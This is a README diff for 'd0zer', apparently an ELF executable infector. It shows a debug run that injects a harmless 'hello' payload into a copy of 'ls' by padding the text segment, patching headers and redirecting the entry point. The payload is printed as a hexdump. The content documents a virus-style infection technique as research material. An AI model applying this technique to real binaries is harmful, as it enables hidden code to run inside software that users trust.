@@ -40,3 +40,48 @@ epiloguejmp  jmp-to-oep      jmp-to-oep.asm    non-destructive-payload32  non-de
 [sad0p@Arch-Deliberate d0zer]$ 
 </pre>
 
+Supplying `-debug` allows you to see each step of the infection algorithm at work aswell as a hexdump of the payload as it will be in the binary. 
+
+<pre>
+[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -debug
+[+] Modified entry point from 0x5b20 -> 0x173d1
+[+] Text segment starts @ 0x4000
+[+] Text segment ends @ 0x173d1
+[+] Payload size pre-epilogue 0x5c
+[+] Payload size post-epilogue 0x90
+------------------PAYLOAD----------------------------
+00000000  50 51 53 52 56 57 55 54  41 50 41 51 41 52 41 53  |PQSRVWUTAPAQARAS|
+00000010  41 54 41 55 41 56 41 57  eb 00 e8 2b 00 00 00 68  |ATAUAVAW...+...h|
+00000020  65 6c 6c 6f 20 2d 2d 20  74 68 69 73 20 69 73 20  |ello -- this is |
+00000030  61 20 6e 6f 6e 20 64 65  73 74 72 75 63 74 69 76  |a non destructiv|
+00000040  65 20 70 61 79 6c 6f 61  64 0a b8 01 00 00 00 bf  |e payload.......|
+00000050  01 00 00 00 5e ba 2a 00  00 00 0f 05 41 5f 41 5e  |....^.*.....A_A^|
+00000060  41 5d 41 5c 41 5b 41 5a  41 59 41 58 5c 5d 5f 5e  |A]A\A[AZAYAX\]_^|
+00000070  5a 5b 59 58 e8 12 00 00  00 48 83 e8 79 48 2d d1  |Z[YX.....H..yH-.|
+00000080  73 01 00 48 05 20 5b 00  00 ff e0 48 8b 04 24 c3  |s..H. [....H..$.|
+--------------------END------------------------------
+[+] Generated and appended position independent return 2 OEP stub to payload
+[+] Increased text segment p_filesz and p_memsz by 144 (length of payload)
+[+] Adjusting segments after text segment file offsets by 0x%x 4096
+Inceasing pHeader @ index 4 by 0x1000
+Inceasing pHeader @ index 5 by 0x1000
+Inceasing pHeader @ index 6 by 0x1000
+Inceasing pHeader @ index 8 by 0x1000
+Inceasing pHeader @ index 10 by 0x1000
+[+] Increasing section header addresses if they come after text segment
+[+] Extending section header entry for text section by payload len.
+[+] (15) Updating sections past text segment @ addr 0x18000
+[+] (16) Updating sections past text segment @ addr 0x1d324
+[+] (17) Updating sections past text segment @ addr 0x1dc78
+[+] (18) Updating sections past text segment @ addr 0x21fd0
+[+] (19) Updating sections past text segment @ addr 0x21fd8
+[+] (20) Updating sections past text segment @ addr 0x21fe0
+[+] (21) Updating sections past text segment @ addr 0x22a58
+[+] (22) Updating sections past text segment @ addr 0x22c58
+[+] (23) Updating sections past text segment @ addr 0x23000
+[+] (24) Updating sections past text segment @ addr 0x23280
+[+] (25) Updating sections past text segment @ addr 0x0
+[+] (26) Updating sections past text segment @ addr 0x0
+[+] writing payload into the binary
+[sad0p@Arch-Deliberate d0zer]$ 
+</pre>
